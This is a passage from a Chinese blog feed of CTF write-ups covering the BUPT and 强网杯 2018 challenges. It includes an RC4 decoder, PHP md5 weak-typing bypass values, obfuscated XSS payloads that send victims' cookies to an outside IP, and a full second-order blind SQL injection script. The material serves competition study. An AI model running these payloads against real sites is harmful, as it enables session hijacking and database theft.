<span class="token punctuation">,</span><span class="token number">0x0C</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x15</span><span class="token punctuation">,</span><span class="token number">0xD1</span><span class="token punctuation">,</span><span class="token number">0xB4</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0xC5</span><span class="token punctuation">,</span><span class="token number">0x7F</span><span class="token punctuation">,</span><span class="token number">0x77</span><span class="token punctuation">,</span><span class="token number">0xF2</span><span class="token punctuation">,</span><span class="token number">0xA4</span><span class="token punctuation">,</span><span class="token number">0x5D</span><span class="token punctuation">,</span><span class="token number">0xF6</span>
<span class="token punctuation">,</span><span class="token number">0xFB</span><span class="token punctuation">,</span><span class="token number">0x67</span><span class="token punctuation">,</span><span class="token number">0xAC</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token number">0x72</span><span class="token punctuation">,</span><span class="token number">0x8D</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">0x09</span><span class="token punctuation">,</span><span class="token number">0x7C</span><span class="token punctuation">,</span><span class="token number">0x8F</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">,</span><span class="token number">0xB8</span><span class="token punctuation">,</span><span class="token number">0x81</span><span class="token punctuation">,</span><span class="token number">0xB0</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span><span class="token number">0xDC</span>
<span class="token punctuation">,</span><span class="token number">0xA8</span><span class="token punctuation">,</span><span class="token number">0xE0</span><span class="token punctuation">,</span><span class="token number">0xC6</span><span class="token punctuation">,</span><span class="token number">0xDA</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span><span class="token number">0x97</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0xE3</span><span class="token punctuation">,</span><span class="token number">0x14</span><span class="token punctuation">,</span><span class="token number">0x9C</span><span class="token punctuation">,</span><span class="token number">0x34</span><span class="token punctuation">,</span><span class="token number">0xD7</span><span class="token punctuation">,</span><span class="token number">0xD8</span><span class="token punctuation">,</span><span class="token number">0x5B</span><span class="token punctuation">,</span><span class="token number">0x3F</span>
<span class="token punctuation">,</span><span class="token number">0xFE</span><span class="token punctuation">,</span><span class="token number">0x2E</span><span class="token punctuation">,</span><span class="token number">0x33</span><span class="token punctuation">,</span><span class="token number">0x06</span><span class="token punctuation">,</span><span class="token number">0x7B</span><span class="token punctuation">,</span><span class="token number">0xDE</span><span class="token punctuation">,</span><span class="token number">0xC9</span><span class="token punctuation">,</span><span class="token number">0xE7</span><span class="token punctuation">,</span><span class="token number">0x9D</span><span class="token punctuation">,</span><span class="token number">0x5E</span><span class="token punctuation">,</span><span class="token number">0xF9</span><span class="token punctuation">,</span><span class="token number">0x3B</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0x5F</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token number">0xA2</span>
<span class="token punctuation">,</span><span class="token number">0xB6</span><span class="token punctuation">,</span><span class="token number">0xA3</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span><span class="token number">0xAE</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0x37</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0xBA</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token number">0x07</span><span class="token punctuation">,</span><span class="token number">0xB9</span><span class="token punctuation">,</span><span class="token number">0x1E</span><span class="token punctuation">,</span><span class="token number">0x9A</span><span class="token punctuation">,</span><span class="token number">0x2B</span>
<span class="token punctuation">,</span><span class="token number">0x1A</span><span class="token punctuation">,</span><span class="token number">0x1B</span><span class="token punctuation">,</span><span class="token number">0x39</span><span class="token punctuation">,</span><span class="token number">0xEB</span><span class="token punctuation">,</span><span class="token number">0x93</span><span class="token punctuation">,</span><span class="token number">0x2C</span><span class="token punctuation">,</span><span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0x6B</span><span class="token punctuation">,</span><span class="token number">0x9B</span><span class="token punctuation">,</span><span class="token number">0x47</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0xEC</span><span class="token punctuation">,</span><span class="token number">0xC0</span><span class="token punctuation">,</span><span class="token number">0xA1</span><span class="token punctuation">,</span><span class="token number">0x98</span><span class="token punctuation">,</span><span class="token number">0xFC</span>
<span class="token punctuation">,</span><span class="token number">0xA6</span><span class="token punctuation">,</span><span class="token number">0xE6</span><span class="token punctuation">,</span><span class="token number">0xC3</span><span class="token punctuation">,</span><span class="token number">0x62</span><span class="token punctuation">,</span><span class="token number">0xAF</span><span class="token punctuation">,</span><span class="token number">0x17</span><span class="token punctuation">,</span><span class="token number">0x6A</span><span class="token punctuation">,</span><span class="token number">0xB7</span><span class="token punctuation">,</span><span class="token number">0x25</span><span class="token punctuation">,</span><span class="token number">0x5A</span><span class="token punctuation">,</span><span class="token number">0xE9</span><span class="token punctuation">,</span><span class="token number">0x5C</span><span class="token punctuation">,</span><span class="token number">0x54</span><span class="token punctuation">,</span><span class="token number">0x0A</span><span class="token punctuation">,</span><span class="token number">0x86</span><span class="token punctuation">,</span><span class="token number">0xD4</span>
<span class="token punctuation">,</span><span class="token number">0xE4</span><span class="token punctuation">,</span><span class="token number">0xF0</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x0F</span><span class="token punctuation">,</span><span class="token number">0xB2</span><span class="token punctuation">,</span><span class="token number">0x0B</span><span class="token punctuation">,</span><span class="token number">0x7E</span><span class="token punctuation">,</span><span class="token number">0x9F</span><span class="token punctuation">,</span><span class="token number">0x4F</span><span class="token punctuation">,</span><span class="token number">0xCE</span><span class="token punctuation">,</span><span class="token number">0xF5</span><span class="token punctuation">,</span><span class="token number">0x99</span><span class="token punctuation">,</span><span class="token number">0xB5</span><span class="token punctuation">,</span><span class="token number">0xC4</span><span class="token punctuation">,</span><span class="token number">0x4D</span><span class="token punctuation">,</span><span class="token number">0xA7</span>
<span class="token punctuation">,</span><span class="token number">0xCA</span><span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">,</span><span class="token number">0x12</span><span class="token punctuation">,</span><span class="token number">0xE1</span><span class="token punctuation">,</span><span class="token number">0x8C</span><span class="token punctuation">,</span><span class="token number">0x36</span><span class="token punctuation">,</span><span class="token number">0xDF</span><span class="token punctuation">,</span><span class="token number">0xE8</span><span class="token punctuation">,</span><span class="token number">0x6E</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">,</span><span class="token number">0xD2</span><span class="token punctuation">,</span><span class="token number">0x46</span><span class="token punctuation">,</span><span class="token number">0x26</span><span class="token punctuation">,</span><span class="token number">0xD0</span><span class="token punctuation">,</span><span class="token number">0x03</span>
<span class="token punctuation">,</span><span class="token number">0xC1</span><span class="token punctuation">,</span><span class="token number">0xC7</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xBB</span><span class="token punctuation">,</span><span class="token number">0x2A</span><span class="token punctuation">,</span><span class="token number">0x7D</span><span class="token punctuation">,</span><span class="token number">0x3A</span><span class="token punctuation">,</span><span class="token number">0xEF</span><span class="token punctuation">,</span><span class="token number">0x4C</span><span class="token punctuation">,</span><span class="token number">0xBD</span><span class="token punctuation">,</span><span class="token number">0xEE</span><span class="token punctuation">,</span><span class="token number">0xFA</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0xFF</span>
<span class="token punctuation">,</span><span class="token number">0xCD</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x51</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0x57</span><span class="token punctuation">,</span><span class="token number">0xA5</span><span class="token punctuation">,</span><span class="token number">0x82</span><span class="token punctuation">,</span><span class="token number">0x9E</span><span class="token punctuation">,</span><span class="token number">0x69</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0x2D</span><span class="token punctuation">,</span><span class="token number">0x84</span><span class="token punctuation">,</span><span class="token number">0x73</span><span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0x4E</span><span class="token punctuation">,</span><span class="token number">0xBE</span>
<span class="token punctuation">,</span><span class="token number">0x2F</span><span class="token punctuation">,</span><span class="token number">0x76</span><span class="token punctuation">,</span><span class="token number">0x7A</span><span class="token punctuation">,</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token number">0x92</span><span class="token punctuation">,</span><span class="token number">0xDB</span><span class="token punctuation">,</span><span class="token number">0xF7</span><span class="token punctuation">,</span><span class="token number">0xAD</span><span class="token punctuation">,</span><span class="token number">0x3D</span><span class="token punctuation">,</span><span class="token number">0x87</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0xBF</span><span class="token punctuation">,</span><span class="token number">0xEA</span><span class="token punctuation">,</span><span class="token number">0x79</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x27</span><span class="token punctuation">]</span>

a1 <span class="token operator">=</span> <span class="token number">0</span>
a2 <span class="token operator">=</span> <span class="token number">0</span>
temp <span class="token operator">=</span> <span class="token number">0</span>
str<span class="token operator">=</span><span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    a1<span class="token operator">=</span><span class="token punctuation">(</span>a1<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span>
    a2<span class="token operator">=</span><span class="token punctuation">(</span>a2<span class="token operator">+</span>s<span class="token punctuation">[</span>a1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span>
    temp<span class="token operator">=</span>s<span class="token punctuation">[</span>a1<span class="token punctuation">]</span>
    s<span class="token punctuation">[</span>a1<span class="token punctuation">]</span><span class="token operator">=</span>s<span class="token punctuation">[</span>a2<span class="token punctuation">]</span>
    s<span class="token punctuation">[</span>a2<span class="token punctuation">]</span><span class="token operator">=</span>temp
    temp<span class="token operator">=</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>a1<span class="token punctuation">]</span><span class="token operator">+</span>s<span class="token punctuation">[</span>a2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span>
    data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token operator">=</span>s<span class="token punctuation">[</span>temp<span class="token punctuation">]</span>
    str<span class="token operator">+=</span>chr<span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">print</span> str

运行即可跑出flag
<span class="token comment" spellcheck="true">#BUPT{rc4_Cryptography_1sSOEa5y!-_-!!!}</span>
</code></pre>
<p><img src="/2018/04/03/北邮网安杯Writeup/15.jpg" alt="流程4"></p>
<h3 id="Re3"><a href="#Re3" class="headerlink" title="Re3"></a>Re3</h3><p>2333太菜了比赛时间内没做出来0.0</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h2&gt;&lt;h3 id=&quot;WEB1-交易中心，你能买到FLAG吗？&quot;&gt;&lt;a href=&quot;#WEB1-交易中心，你能买到FLAG吗？&quot; class=&quot;headerlink&quot; title=&quot;WEB1 交易中心，你能买到FLAG吗？&quot;&gt;&lt;/a&gt;WEB1 交易中心，你能买到FLAG吗？&lt;/h3&gt;&lt;p&gt;提供了源码下载&lt;br&gt;&lt;img src=&quot;/2018/04/03/北邮网安杯Writeup/3.jpg&quot; alt=&quot;源码&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="北邮网安杯" scheme="http://iosmosis.github.io/tags/%E5%8C%97%E9%82%AE%E7%BD%91%E5%AE%89%E6%9D%AF/"/>
    
      <category term="Writeup" scheme="http://iosmosis.github.io/tags/Writeup/"/>
    
      <category term="RE" scheme="http://iosmosis.github.io/tags/RE/"/>
    
      <category term="Web" scheme="http://iosmosis.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>第二届强网杯部分Writeup</title>
    <link href="http://iosmosis.github.io/2018/03/24/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86Writeup/"/>
    <id>http://iosmosis.github.io/2018/03/24/第二届强网杯部分Writeup/</id>
    <published>2018-03-24T11:31:37.000Z</published>
    <updated>2018-04-05T13:41:30.994Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>  Stegsolve–&gt;<br>  <img src="/2018/03/24/第二届强网杯部分Writeup/7.jpg" alt="网站入口"></p>
<ul>
<li><a id="more"></a>
<p><the rest="" of="" contents="" |="" 余下全文=""><br>偏移得到</the></p>
<p><img src="/2018/03/24/第二届强网杯部分Writeup/8.jpg" alt="网站入口"></p>
</li>
</ul>
<h2 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h2><h4 id="进入web签到给的地址-http-39-107-33-96-10000"><a href="#进入web签到给的地址-http-39-107-33-96-10000" class="headerlink" title="进入web签到给的地址 http://39.107.33.96:10000/"></a>进入web签到给的地址 <a href="http://39.107.33.96:10000/" target="_blank" rel="external">http://39.107.33.96:10000/</a></h4><p><img src="/2018/03/24/第二届强网杯部分Writeup/1.jpg" alt="网站入口"></p>
<h4 id="查看下网站源码-发现hint"><a href="#查看下网站源码-发现hint" class="headerlink" title="查看下网站源码 发现hint"></a>查看下网站源码 发现hint</h4><p><img src="/2018/03/24/第二届强网杯部分Writeup/2.jpg" alt="网站源码"></p>
<h4 id="需要post-“param1”-“param2”-两个值-不能相等但必须md5值相等-，根据了解-这算是一种php弱类型"><a href="#需要post-“param1”-“param2”-两个值-不能相等但必须md5值相等-，根据了解-这算是一种php弱类型" class="headerlink" title="需要post “param1” “param2” 两个值 不能相等但必须md5值相等 ，根据了解 这算是一种php弱类型"></a>需要post “param1” “param2” 两个值 不能相等但必须md5值相等 ，根据了解 这算是一种php弱类型</h4><h3 id="根据了解找到一组值"><a href="#根据了解找到一组值" class="headerlink" title="根据了解找到一组值"></a>根据了解找到一组值</h3><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">md5<span class="token punctuation">(</span>240610708,32<span class="token punctuation">)</span> <span class="token operator">=</span> 0e462097431906509019562988736854
md5<span class="token punctuation">(</span>240610708,16<span class="token punctuation">)</span> <span class="token operator">=</span> 4319065090195629

md5<span class="token punctuation">(</span>QNKCDZO,32<span class="token punctuation">)</span> <span class="token operator">=</span> 0e830400451993494058024219903391
md5<span class="token punctuation">(</span>QNKCDZO,16<span class="token punctuation">)</span> <span class="token operator">=</span> 4519934940580242
</code></pre>
<h4 id="上文提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5-‘240610708’-md5-‘QNKCDZO’-成功绕过"><a href="#上文提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5-‘240610708’-md5-‘QNKCDZO’-成功绕过" class="headerlink" title="上文提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5(‘240610708’) == md5(‘QNKCDZO’)成功绕过!"></a>上文提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5(‘240610708’) == md5(‘QNKCDZO’)成功绕过!</h4><h3 id="来到第二关"><a href="#来到第二关" class="headerlink" title="来到第二关"></a>来到第二关</h3><p><img src="/2018/03/24/第二届强网杯部分Writeup/3.jpg" alt="网站2"></p>
<h4 id="查看网站源码"><a href="#查看网站源码" class="headerlink" title="查看网站源码"></a>查看网站源码</h4><p><img src="/2018/03/24/第二届强网杯部分Writeup/4.jpg" alt="源码2"></p>
<h3 id="第三层需要md5碰撞-找到ms5相同但值不同的两个文件-可以利用工具生成"><a href="#第三层需要md5碰撞-找到ms5相同但值不同的两个文件-可以利用工具生成" class="headerlink" title="第三层需要md5碰撞 找到ms5相同但值不同的两个文件 可以利用工具生成"></a>第三层需要md5碰撞 找到ms5相同但值不同的两个文件 可以利用工具生成</h3><p><img src="/2018/03/24/第二届强网杯部分Writeup/9.jpg" alt="源码2"></p>
<h3 id="share-you-mind"><a href="#share-you-mind" class="headerlink" title="share you mind"></a>share you mind</h3><p>注意到此题环境配置了pathinfo,并且涉及到XSS,所以推测是RPO.<br>当在Write article的内容处写入js代码(不能写标题,因为写入标题后会引入html标签).<br><img src="/2018/03/24/第二届强网杯部分Writeup/10.jpg" alt="源码2"><br>这样就相当于在网站写入了一段纯JS.</p>
<p><img src="/2018/03/24/第二届强网杯部分Writeup/11.jpg" alt="源码2"></p>
<p>访问<a href="http://39.107.33.96:20000/index.php/view/article/729/..%2f..%2f..%2f..%2findex.php即可触发RPO" target="_blank" rel="external">http://39.107.33.96:20000/index.php/view/article/729/..%2f..%2f..%2f..%2findex.php即可触发RPO</a>.</p>
<p><img src="/2018/03/24/第二届强网杯部分Writeup/12.jpg" alt="源码2"></p>
<p>然后讲这个地址Export给后台的机器人就行了.<br>所以思路就是利用这个XSS去打COOKIE.<br>后端过滤了引号,利用fromCharCode绕过.<br>PAYLOAD:<br>(new Image()).src = String.fromCharCode(104,116,116,112,58,47,47,49,51,57,46,49,57,57,46,49,56,53,46,56,57,47) + document.cookie;<br>得到第一个cookie,提示需要进一步打子目录下的COOKIE.</p>
<p>引入一个iframe就行了,<br>PAYLAOD2:</p>
<p></p><p class="code-caption" data-lang="javascript" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">81</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">66</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">81</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">66</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
iframe<span class="token punctuation">.</span>id <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>
iframe<span class="token punctuation">.</span>onload <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token keyword">var</span> c <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span>
<span class="token keyword">var</span> n0t <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
n0t<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
n0t<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">)</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token number">53</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">,</span><span class="token number">63</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token number">61</span><span class="token punctuation">)</span> <span class="token operator">+</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>n0t<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h3 id="Three-hit"><a href="#Three-hit" class="headerlink" title="Three hit"></a>Three hit</h3><p>这道题考察二次注入.<br>注册时提供name,age,password参数;<br>登陆时会根据age参数在数据库中查询age相同的用户的用户名,并且显示出来.<br>age参数做了过滤,提示只能是数字,这里可以利用16进制编码绕过.<br>然后就是常规的二次布尔盲注流程了.<br>脚本如下,每注入出一项数据后,就需要修改下注册用户名的前缀.</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>#! /usr/bin/env python3
# Author : sn00py

import requests
import binascii

url_register = &quot;http://39.107.32.29:10000/index.php?func=register&quot;
url_login = &quot;http://39.107.32.29:10000/index.php?func=login&quot;
result = &#39;[*]result:&#39;
for i in range(1, 65):
    for j in range(32, 127):
        # age = &quot;9527 or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1),{0},1))={1}#&quot;.format(str(i), str(j))
        # age = &quot;9527 or ascii(substr((select column_name from information_schema.columns where table_name = &#39;flag&#39; limit 1),{0},1))={1}#&quot;.format(str(i), str(j))
        age = &quot;9527 or ascii(substr((select flag from flag limit 1),{0},1))={1}#&quot;.format(str(i), str(j))
        age = binascii.hexlify(bytes(age, &#39;utf8&#39;))
        age = &quot;0x&quot; + str(age, &quot;utf8&quot;)
        username = &quot;np7g{0}{1}&quot;.format(str(i), str(j))
        data = {
            &quot;username&quot;: username,
            &quot;password&quot;: &quot;123456&quot;,
            &quot;age&quot;: age
        }
        # 注册
        while True:
            try:
                resp1 = requests.post(url=url_register, data=data, allow_redirects=False)
                # print(&quot;[+]{} 注册成功.&quot;.format(username))
                break
            except Exception as e:
                # print(&quot;[+]{} 注册失败.&quot;.format(username))
                continue
        # 登陆
        while True:
            try:
                resp2 = requests.post(url=url_login, data=data, allow_redirects=True)
                if &quot;&lt;a&gt;123&lt;/a&gt;&quot; in resp2.text:
                    result += chr(j)
                    print(result)
                # print(&quot;[+]{} 登陆成功.&quot;.format(username))
                break
            except Exception as e:
                # print(&quot;[+]{} 登陆失败.&quot;.format(username))
                continue
</code></pre><h3 id="ai-nimals"><a href="#ai-nimals" class="headerlink" title="ai-nimals"></a>ai-nimals</h3><p><img src="/2018/03/24/第二届强网杯部分Writeup/13.jpg" alt="源码2"><br>多次发送狗狗图片的base64编码得到</p>
<h3 id="streamgame1"><a href="#streamgame1" class="headerlink" title="streamgame1"></a>streamgame1</h3><p>位数不是很大，爆破即可</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">lfsr</span><span class="token punctuation">(</span>R<span class="token punctuation">,</span>mask<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output <span class="token operator">=</span> <span class="token punctuation">(</span>R <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffff</span>
    i<span class="token operator">=</span><span class="token punctuation">(</span>R<span class="token operator">&amp;</span>mask<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffffff</span>
    lastbit<span class="token operator">=</span><span class="token number">0</span>
    <span class="token keyword">while</span> i<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>
        lastbit<span class="token operator">^</span><span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token operator">&amp;</span><span class="token number">1</span><span class="token punctuation">)</span>
        i<span class="token operator">=</span>i<span class="token operator">>></span><span class="token number">1</span>
    output<span class="token operator">^</span><span class="token operator">=</span>lastbit
    <span class="token keyword">return</span> <span class="token punctuation">(</span>output<span class="token punctuation">,</span>lastbit<span class="token punctuation">)</span>

mask    <span class="token operator">=</span>   <span class="token number">0b1010011000100011100</span>

<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    a <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> init <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    R <span class="token operator">=</span> init
    ok <span class="token operator">=</span> <span class="token boolean">True</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        tmp<span class="token operator">=</span><span class="token number">0</span>
